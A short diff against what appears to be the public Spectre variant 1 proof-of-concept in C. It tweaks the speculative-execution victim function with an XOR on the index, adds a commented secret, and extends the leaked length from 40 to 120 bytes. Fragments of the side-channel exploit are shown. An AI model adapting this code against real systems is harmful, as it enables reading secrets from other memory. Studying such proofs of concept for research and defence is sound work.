@@ -18,12 +18,12 @@ uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
-
+//char * secret = "It's the secret";
 uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
 
 void victim_function(size_t x) {
 	if (x < array1_size) {
-		temp &= array2[array1[x] * 512];
+		temp &= array2[array1[x ^ 255] * 512];
 	}
 }
 
@@ -132,7 +132,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 int main(int argc, const char **argv) {
 	size_t malicious_x=(size_t)(secret-(char*)array1);   /* default for malicious_x */
-	int i, score[2], len=40;
+	int i, score[2], len=120;
 	uint8_t value[2];
 
 	for (i = 0; i < sizeof(array2); i++)
